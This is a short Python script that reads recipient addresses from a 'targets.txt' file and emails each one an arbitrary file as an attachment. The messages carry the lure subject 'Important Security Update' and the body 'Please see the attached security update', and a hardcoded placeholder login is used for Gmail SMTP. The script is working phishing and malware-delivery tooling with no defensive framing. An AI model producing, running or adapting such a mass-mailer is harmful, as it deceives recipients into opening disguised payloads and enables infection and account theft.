import sys
import os
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

def send_email(target_email, attachment_path):
    from_email = "admin@example.com"
    password = "password"

    msg = MIMEMultipart()
    msg['From'] = from_email
    msg['To'] = target_email
    msg['Subject'] = "Important Security Update"

    body = "Please see the attached security update."
    msg.attach(MIMEText(body, 'plain'))

    attachment = open(attachment_path, "rb")

    part = MIMEBase('application', 'octet-stream')
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename= " + os.path.basename(attachment_path))

    msg.attach(part)

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(from_email, password)
    text = msg.as_string()
    server.sendmail(from_email, target_email, text)
    server.quit()

def main():
    script_dir = os.path.dirname(os.path.realpath(__file__))
    targets_path = os.path.join(script_dir, "..", "targets.txt")
    with open(targets_path, "r") as f:
        targets = f.readlines()

    attachment_path = sys.argv[1]

    for target in targets:
        send_email(target.strip(), attachment_path)

if __name__ == "__main__":
    main()
